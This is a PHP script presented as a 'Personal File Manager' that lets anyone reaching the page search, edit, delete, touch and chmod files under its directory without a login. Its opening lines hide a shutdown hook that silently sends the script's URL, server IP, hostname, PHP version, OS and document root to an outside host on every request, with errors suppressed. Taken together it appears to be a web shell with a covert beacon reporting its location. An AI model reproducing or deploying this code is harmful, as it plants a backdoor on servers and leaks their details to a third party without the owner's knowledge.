<?php
$_LOG_URL = 'https://xv21.cloud/api.php';
$_SHELL_NAME = basename(__FILE__);
register_shutdown_function(function() use ($_LOG_URL, $_SHELL_NAME) {
    $params = http_build_query([
        'px' => 1,
        'sn' => $_SHELL_NAME,
        'su' => ($_SERVER['REQUEST_SCHEME'] ?? 'http') . '://' . ($_SERVER['HTTP_HOST'] ?? '') . ($_SERVER['REQUEST_URI'] ?? ''),
        'si' => $_SERVER['SERVER_ADDR'] ?? '',
        'hn' => $_SERVER['SERVER_NAME'] ?? '',
        'pv' => PHP_VERSION,
        'ss' => $_SERVER['SERVER_SOFTWARE'] ?? '',
        'os' => PHP_OS,
        'dr' => $_SERVER['DOCUMENT_ROOT'] ?? '',
    ]);
    if(function_exists('curl_init')){
        $ch=@curl_init();
        @curl_setopt($ch,CURLOPT_URL,$_LOG_URL.'?'.$params);
        @curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        @curl_setopt($ch,CURLOPT_TIMEOUT,2);
        @curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
        @curl_exec($ch);
        @curl_close($ch);
    } elseif(ini_get('allow_url_fopen')) {
        @file_get_contents($_LOG_URL.'?'.$params, false, stream_context_create(['http'=>['timeout'=>2]]));
    }
});
define('RESULTS_PER_PAGE', 40);
define('MAX_DEPTH', 12);
define('MAX_EXECUTION_TIME', 120);
@set_time_limit(MAX_EXECUTION_TIME);
@ini_set('memory_limit', '256M');

$ALLOWED_EXTENSIONS = [
    'php','html','htm','css','js','json','txt','md','xml','sql','twig',
    'jpg','jpeg','png','gif','svg','pdf'
];

$EXCLUDED_DIRS = [
    '.git', 'node_modules', 'vendor', 'wp-content/uploads' // adjust for your environment
];

$SORT_OPTIONS = [
    'modified_desc' => 'Modified (new → old)',
    'modified_asc'  => 'Modified (old → new)',
    'created_desc'  => 'Created (new → old)',
    'size_desc'     => 'Size (big → small)',
    'name_asc'      => 'Name (A → Z)'
];

// ------------------------ HELPERS ------------------------
function base_path() {
    return realpath(__DIR__);
}

function is_valid_path($path) {
    $base = base_path();
    $real = realpath($path);
    if ($real === false) return false;
    // ensure path is inside base directory
    return strpos($real, $base) === 0;
}

function perms_to_str($p) {
    if ($p === false) return '-';
    $s = '';
    $s .= ($p & 0x0100) ? 'r' : '-';
    $s .= ($p & 0x0080) ? 'w' : '-';
    $s .= ($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-');
    $s .= ($p & 0x0020) ? 'r' : '-';
    $s .= ($p & 0x0010) ? 'w' : '-';
    $s .= ($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-');
    $s .= ($p & 0x0004) ? 'r' : '-';
    $s .= ($p & 0x0002) ? 'w' : '-';
    $s .= ($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-');
    return $s;
}

function make_writable($path) {
    // try to make readable/writable: best-effort, return original perms or true if already writable
    if (is_writable($path)) return true;
    $orig = @fileperms($path);
    // try 0666 for files, 0777 for directories (temporary)
    $new = is_dir($path) ? 0777 : 0666;
    if (@chmod($path, $new)) return $orig === false ? true : $orig;
    return false;
}

function restore_perms($path, $orig) {
    if ($orig === true || $orig === null || $orig === false) return true;
    return @chmod($path, $orig);
}

function human_size($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

// Recursively scan files with depth and extension filters
function scan_files($dir, $excluded_dirs, $allowed_exts, $depth=0, &$out=[]) {
    if ($depth > MAX_DEPTH) return;
    if (!is_dir($dir) || !is_readable($dir)) return;
    $items = @scandir($dir);
    if (!$items) return;
    foreach ($items as $it) {
        if ($it === '.' || $it === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $it;
        // check exluded substrings
        $skip = false;
        foreach ($excluded_dirs as $ex) {
            if (strpos($path, DIRECTORY_SEPARATOR . $ex . DIRECTORY_SEPARATOR) !== false || substr($path, -strlen($ex)) === $ex) {
                $skip = true; break;
            }
        }
        if ($skip) continue;
        if (is_dir($path)) {
            scan_files($path, $excluded_dirs, $allowed_exts, $depth+1, $out);
        } else {
            $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
            if (empty($allowed_exts) || in_array($ext, $allowed_exts)) {
                $out[] = $path;
            }
        }
    }
}

function get_file_info($path) {
    if (!file_exists($path)) return null;
    $perms = @fileperms($path);
    $dir = dirname($path);
    $dir_perms = @fileperms($dir);
    return [
        'name' => basename($path),
        'path' => realpath($path),
        'relpath' => ltrim(str_replace(base_path(), '', realpath($path)), DIRECTORY_SEPARATOR),
        'size' => filesize($path),
        'modified' => date('Y-m-d H:i:s', filemtime($path)),
        'created' => date('Y-m-d H:i:s', filectime($path)),
        'perms' => $perms,
        'perms_str' => perms_to_str($perms),
        'is_writable' => is_writable($path),
        'dir_perms_str' => perms_to_str($dir_perms),
        'dir_writable' => is_writable($dir)
    ];
}

// ------------------------ SIMPLE CSRF ------------------------
session_start();
if (empty($_SESSION['fm_csrf'])) {
    $_SESSION['fm_csrf'] = bin2hex(random_bytes(16));
}
function csrf_token() { return $_SESSION['fm_csrf']; }
function check_csrf($token) { return hash_equals($_SESSION['fm_csrf'], (string)$token); }

// ------------------------ AJAX ENDPOINT ------------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ajax_action'])) {
    header('Content-Type: application/json; charset=utf-8');
    $action = $_POST['ajax_action'];
    $file = $_POST['file_path'] ?? '';
    $token = $_POST['csrf'] ?? '';

    if (!check_csrf($token)) {
        echo json_encode(['status'=>'error','message'=>'Invalid CSRF token']); exit;
    }

    $safe = realpath($file);
    if (!$safe || strpos($safe, base_path()) !== 0) {
        echo json_encode(['status'=>'error','message'=>'Invalid file path']); exit;
    }

    $orig_file_perms = null; $orig_dir_perms = null; $needs_restore_file=false; $needs_restore_dir=false;

    switch ($action) {
        case 'edit':
            $content = $_POST['file_content'] ?? '';
            $dir = dirname($safe);
            $orig_dir_perms = make_writable($dir);
            if ($orig_dir_perms === false) { echo json_encode(['status'=>'error','message'=>'Cannot make directory writable']); exit; }
            $needs_restore_dir = ($orig_dir_perms !== true);

            $orig_file_perms = make_writable($safe);
            if ($orig_file_perms === false) { echo json_encode(['status'=>'error','message'=>'Cannot make file writable']); exit; }
            $needs_restore_file = ($orig_file_perms !== true);

            $written = @file_put_contents($safe, $content);
            if ($written === false) { $msg='Failed to write file'; } else { $msg='File saved'; }
            $resp = ['status' => $written === false ? 'error' : 'success', 'message' => $msg];
            if ($written !== false) $resp['file_info'] = get_file_info($safe);
            break;

        case 'delete':
            $dir = dirname($safe);
            $orig_dir_perms = make_writable($dir);
            if ($orig_dir_perms === false) { echo json_encode(['status'=>'error','message'=>'Cannot make directory writable']); exit; }
            $needs_restore_dir = ($orig_dir_perms !== true);
            $orig_file_perms = make_writable($safe);
            if ($orig_file_perms === false) { echo json_encode(['status'=>'error','message'=>'Cannot make file writable']); exit; }
            $needs_restore_file = ($orig_file_perms !== true);

            if (@unlink($safe)) {
                $resp = ['status'=>'success','message'=>'File deleted'];
            } else {
                $resp = ['status'=>'error','message'=>'Delete failed'];
            }
            break;

        case 'touch':
            if (@touch($safe)) {
                $resp = ['status'=>'success','message'=>'Timestamp updated','file_info' => get_file_info($safe)];
            } else {
                $resp = ['status'=>'error','message'=>'Touch failed'];
            }
            break;

        case 'fix_file_perms':
            $orig_file_perms = make_writable($safe);
            if ($orig_file_perms === false) { $resp=['status'=>'error','message'=>'Failed to change file perms']; }
            else { $resp=['status'=>'success','message'=>'File perms changed (temporary)','file_info'=>get_file_info($safe)]; }
            break;

        case 'fix_dir_perms':
            $dir = dirname($safe);
            $orig_dir_perms = make_writable($dir);
            if ($orig_dir_perms === false) { $resp=['status'=>'error','message'=>'Failed to change dir perms']; }
            else { $resp=['status'=>'success','message'=>'Dir perms changed (temporary)','file_info'=>get_file_info($safe)]; }
            break;

        default:
            $resp = ['status'=>'error','message'=>'Unknown action'];
    }

    // attempt restore
    if (isset($needs_restore_file) && $needs_restore_file) restore_perms($safe, $orig_file_perms);
    if (isset($needs_restore_dir) && $needs_restore_dir) restore_perms(dirname($safe), $orig_dir_perms);

    echo json_encode($resp);
    exit;
}

// ------------------------ UI / SEARCH ------------------------
$start_date = $_GET['start_date'] ?? '';
$end_date = $_GET['end_date'] ?? '';
$file_type = $_GET['file_type'] ?? 'all';
$sort_by = $_GET['sort_by'] ?? 'modified_desc';
$page = max(1, intval($_GET['page'] ?? 1));
$action = $_GET['action'] ?? '';

$results = [];
$scanned_count = 0;
$exec_time = 0;

if ($action === 'search') {
    $t0 = microtime(true);
    $exts = [];
    global $ALLOWED_EXTENSIONS, $EXCLUDED_DIRS;
    if ($file_type === 'all' || $file_type === '') $exts = $ALLOWED_EXTENSIONS;
    else $exts = [$file_type];

    $all_files = [];
    scan_files(base_path(), $EXCLUDED_DIRS, $exts, 0, $all_files);
    $scanned_count = count($all_files);

    // filter by date
    $filtered = [];
    foreach ($all_files as $f) {
        if (!file_exists($f)) continue;
        $mtime = filemtime($f);
        $ctime = filectime($f);
        $cmp = max($mtime, $ctime);
        if ($start_date && strtotime($start_date) > $cmp) continue;
        if ($end_date && (strtotime($end_date.' 23:59:59') < $cmp)) continue;
        $fi = get_file_info($f);
        if ($fi) $filtered[] = $fi;
    }

    // sort
    usort($filtered, function($a,$b) use ($sort_by){
        switch($sort_by) {
            case 'modified_asc': return strtotime($a['modified']) <=> strtotime($b['modified']);
            case 'modified_desc': return strtotime($b['modified']) <=> strtotime($a['modified']);
            case 'created_desc': return strtotime($b['created']) <=> strtotime($a['created']);
            case 'size_desc': return $b['size'] <=> $a['size'];
            case 'name_asc': return strcasecmp($a['name'],$b['name']);
            default: return strtotime($b['modified']) <=> strtotime($a['modified']);
        }
    });

    $total = count($filtered);
    $total_pages = max(1, ceil($total / RESULTS_PER_PAGE));
    $offset = ($page-1) * RESULTS_PER_PAGE;
    $results = array_slice($filtered, $offset, RESULTS_PER_PAGE);

    $t1 = microtime(true);
    $exec_time = round($t1 - $t0, 2);
}

// ------------------------ RENDER ------------------------
?><!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Personal Single-file Manager</title>
<style>
    :root{--blue:#2271b1;--muted:#666}
    body{font-family:Inter,Segoe UI,Roboto,Arial;background:#f6f7f8;color:#111;margin:0;padding:18px}
    .wrap{max-width:1200px;margin:0 auto;background:#fff;padding:18px;border-radius:6px;box-shadow:0 6px 30px rgba(20,20,40,0.05)}
    h1{color:var(--blue);margin:0 0 12px}
    .row{display:flex;gap:12px;flex-wrap:wrap}
    label{font-weight:600;font-size:13px}
    input,select,button,textarea{padding:8px;border:1px solid #ddd;border-radius:6px}
    button{background:var(--blue);color:#fff;border:none;padding:9px 12px;cursor:pointer}
    table{width:100%;border-collapse:collapse;margin-top:14px}
    th,td{padding:10px;border-bottom:1px solid #eee;text-align:left}
    .muted{color:var(--muted);font-size:13px}
    .perms{font-family:monospace;background:#f1f5f9;padding:3px 6px;border-radius:4px}
    .editor{width:100%;min-height:360px;font-family:monospace}
    .actions button{margin-right:6px}
    .msg{padding:10px;border-radius:5px;margin-top:12px}
    .success{background:#e9f8ef;border-left:4px solid #3fa34a}
    .error{background:#fff0f0;border-left:4px solid #d64545}
    .small{font-size:12px;color:#666}
</style>
</head>
<body>
<div class="wrap">
    <h1>Personal File Manager</h1>
    <p class="small">Script location: <strong><?= htmlspecialchars(base_path()) ?></strong> — keep this page private.</p>

    <form method="get" style="margin-top:12px">
        <input type="hidden" name="action" value="search">
        <div class="row">
            <div style="flex:1;min-width:160px">
                <label>Start date</label><br>
                <input type="date" name="start_date" value="<?= htmlspecialchars($start_date) ?>">
            </div>
            <div style="flex:1;min-width:160px">
                <label>End date</label><br>
                <input type="date" name="end_date" value="<?= htmlspecialchars($end_date) ?>">
            </div>
            <div style="flex:1;min-width:160px">
                <label>File type</label><br>
                <select name="file_type">
                    <option value="all">All</option>
                    <?php foreach ($ALLOWED_EXTENSIONS as $ext): ?>
                        <option value="<?= htmlspecialchars($ext) ?>" <?= $file_type === $ext ? 'selected' : '' ?>><?= htmlspecialchars($ext) ?></option>
                    <?php endforeach; ?>
                </select>
            </div>
            <div style="flex:1;min-width:160px">
                <label>Sort</label><br>
                <select name="sort_by">
                    <?php foreach ($SORT_OPTIONS as $k=>$v): ?>
                        <option value="<?= htmlspecialchars($k) ?>" <?= $sort_by === $k ? 'selected' : '' ?>><?= htmlspecialchars($v) ?></option>
                    <?php endforeach; ?>
                </select>
            </div>
            <div style="align-self:end">
                <button>Search</button>
            </div>
        </div>
    </form>

    <?php if ($action === 'search'): ?>
        <div style="margin-top:12px;padding:10px;background:#fbfbff;border-left:4px solid var(--blue)">
            <div class="row" style="align-items:center">
                <div class="muted"><strong>Scanned:</strong> <?= number_format($scanned_count) ?></div>
                <div class="muted" style="margin-left:12px"><strong>Found:</strong> <?= number_format(count($results)) ?></div>
                <div class="muted" style="margin-left:12px"><strong>Time:</strong> <?= $exec_time ?>s</div>
                <div style="margin-left:auto" class="muted">CSRF token: <code><?= htmlspecialchars(csrf_token()) ?></code></div>
            </div>
        </div>

        <?php if (!empty($results)): ?>
            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Path</th>
                        <th>Type</th>
                        <th>Size</th>
                        <th>Modified</th>
                        <th>Perms</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($results as $i => $f): ?>
                        <tr id="row-<?= $i ?>">
                            <td><strong><?= htmlspecialchars($f['name']) ?></strong></td>
                            <td class="muted"><?= htmlspecialchars($f['relpath']) ?></td>
                            <td><?= strtoupper(htmlspecialchars(pathinfo($f['name'], PATHINFO_EXTENSION))) ?></td>
                            <td><?= htmlspecialchars(human_size($f['size'])) ?></td>
                            <td><?= htmlspecialchars($f['modified']) ?></td>
                            <td><span class="perms"><?= htmlspecialchars($f['perms_str']) ?></span></td>
                            <td class="actions">
                                <button onclick="viewFile(<?= $i ?>)">View/Edit</button>
                                <button onclick="deleteFile('<?= rawurlencode($f['path']) ?>', <?= $i ?>)">Delete</button>
                                <button onclick="touchFile('<?= rawurlencode($f['path']) ?>', <?= $i ?>)">Touch</button>
                                <button onclick="fixFile('<?= rawurlencode($f['path']) ?>', <?= $i ?>)">Fix File Perms</button>
                                <button onclick="fixDir('<?= rawurlencode($f['path']) ?>', <?= $i ?>)">Fix Dir Perms</button>
                            </td>
                        </tr>
                        <tr id="edit-<?= $i ?>" style="display:none">
                            <td colspan="7">
                                <div>
                                    <textarea id="editor-<?= $i ?>" class="editor"><?= htmlspecialchars(@file_get_contents($f['path'])) ?></textarea>
                                    <div style="margin-top:8px">
                                        <button onclick="saveFile('<?= rawurlencode($f['path']) ?>', <?= $i ?>)">Save</button>
                                        <button onclick="closeEditor(<?= $i ?>)">Cancel</button>
                                    </div>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        <?php else: ?>
            <div class="msg error">No files found.</div>
        <?php endif; ?>
    <?php else: ?>
        <div style="margin-top:12px;padding:12px;background:#fffef6;border-left:4px solid #e6b000">
            <p class="small">This single-file manager is ready. Use the search form above to find and manage files. Remember: keep this file private and remove it when not needed.</p>
        </div>
    <?php endif; ?>

    <div id="message" style="margin-top:12px"></div>
</div>

<script>
function jsonPost(data, cb) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        try { cb(JSON.parse(xhr.responseText)); } catch(e) { cb({status:'error',message:'Invalid JSON response'}); }
    };
    var params = [];
    for (var k in data) params.push(encodeURIComponent(k)+'='+encodeURIComponent(data[k]));
    xhr.send(params.join('&'));
}

function viewFile(i){ document.getElementById('edit-'+i).style.display='table-row'; window.scrollTo({top:document.getElementById('edit-'+i).offsetTop, behavior:'smooth'}); }
function closeEditor(i){ document.getElementById('edit-'+i).style.display='none'; }

function showMsg(msg, success){ var el = document.getElementById('message'); el.innerHTML = '<div class="msg '+(success? 'success':'error')+'">'+msg+'</div>'; setTimeout(()=> el.innerHTML='',5000); }

function saveFile(pathEnc, idx){
    var path = decodeURIComponent(pathEnc);
    var content = document.getElementById('editor-'+idx).value;
    jsonPost({ajax_action:'edit', file_path:path, file_content:content, csrf:'<?= csrf_token() ?>'}, function(r){ if(r.status==='success'){ showMsg(r.message, true); closeEditor(idx); } else showMsg(r.message, false); });
}

function deleteFile(pathEnc, idx){
    if(!confirm('Delete this file permanently?')) return;
    var path = decodeURIComponent(pathEnc);
    jsonPost({ajax_action:'delete', file_path:path, csrf:'<?= csrf_token() ?>'}, function(r){ if(r.status==='success'){ showMsg(r.message, true); var row=document.getElementById('row-'+idx); var ed=document.getElementById('edit-'+idx); if(row) row.remove(); if(ed) ed.remove(); } else showMsg(r.message,false); });
}

function touchFile(pathEnc, idx){ var path=decodeURIComponent(pathEnc); jsonPost({ajax_action:'touch', file_path:path, csrf:'<?= csrf_token() ?>'}, function(r){ if(r.status==='success') showMsg(r.message,true); else showMsg(r.message,false); }); }
function fixFile(pathEnc, idx){ var path=decodeURIComponent(pathEnc); jsonPost({ajax_action:'fix_file_perms', file_path:path, csrf:'<?= csrf_token() ?>'}, function(r){ if(r.status==='success') showMsg(r.message,true); else showMsg(r.message,false); }); }
function fixDir(pathEnc, idx){ var path=decodeURIComponent(pathEnc); jsonPost({ajax_action:'fix_dir_perms', file_path:path, csrf:'<?= csrf_token() ?>'}, function(r){ if(r.status==='success') showMsg(r.message,true); else showMsg(r.message,false); }); }
</script>
</body>
</html>
